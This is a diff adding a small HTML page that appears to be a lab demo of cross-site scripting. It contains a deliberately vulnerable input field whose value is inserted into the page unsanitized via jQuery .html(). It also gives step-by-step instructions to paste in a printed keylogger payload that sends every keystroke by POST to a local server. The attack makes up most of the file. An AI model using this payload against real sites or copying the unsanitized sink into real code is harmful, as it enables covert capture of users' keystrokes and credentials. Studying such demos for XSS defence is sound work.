@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title></title>
+    </head>
+    <body>
+        <h3>Cross Site Scripting Test</h3>
+        <input type="text" name="" value="">
+        <button type='submit'>Submit</button>
+        <div></div>
+        <pre>
+
+- Copy code below
+- Paste into input box above
+- Click submit
+- Open console
+- Start typing random words
+- Go to:
+- You should see your letters displayed
+
+------------------------------------------
+
+&lt;link rel="icon" href="data:,">
+
+
+&lt;script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js">&lt;/script>
+
+&lt;script>
+
+    $(document).on('keypress',function(key){
+        var letter = String.fromCharCode(key.charCode);
+        console.log(letter);
+
+        $.post('http://localhost:5000/' + letter);
+    })
+
+
+&lt;/script>
+        </pre>
+
+
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+        <script type="text/javascript">
+            $("button").on('click', function(){
+                $("div").html($("input").val())
+            })
+
+
+
+        </script>
+    </body>
+</html>
